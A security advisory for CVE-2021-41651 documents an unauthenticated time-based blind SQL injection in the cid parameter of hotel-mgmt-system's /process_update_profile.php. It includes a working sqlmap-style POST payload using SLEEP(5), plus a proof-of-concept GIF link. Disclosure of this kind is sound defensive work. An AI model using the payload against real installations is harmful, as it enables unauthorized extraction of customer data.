# CVE-2021-41651

CVE-2021-41651 SQL Injection in hotel-mgmt-system

The hotel-mgmt-system is vulnerable to un-authenticated time based blind SQL Injection attack.  <br/><br/>
The cid parameter on the /process_update_profile.php page does not sanitize the user input, an attacker can extract sensisitive data from the underlying MySQL Database.  <br/><br/> 

## Link To Application
[hotel-mgmt-system](https://github.com/tramyardg/hotel-mgmt-system)

## Affected Components & Parameter
URL: **/process_update_profile.php**  
PARAMETER: **cid**<br/><br/>

## Poc's

### SQLMAP PAYLOADS<br/>
### cid parameter on the /process_update_profile.php page
Parameter: cid ((custom) POST)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: `phone=123456778&cid=14 AND (SELECT 9048 FROM (SELECT(SLEEP(5)))zCfD)-- IKdVf&submitBtn=Update&fullName=James&email=me@you.com&newPassword=fasdfasdfasdfasdfasdf-`

### If the POC Image is unclear, please click on the GIF which will load in a better resolution.

![ POC - CID ](https://github.com/MobiusBinary/F3/blob/main/hotel.gif) 

## Discovered by
Jason Colyvas  
[MOBIUSBINARY](https://mobiusbinary.com)  
September 23rd, 2021
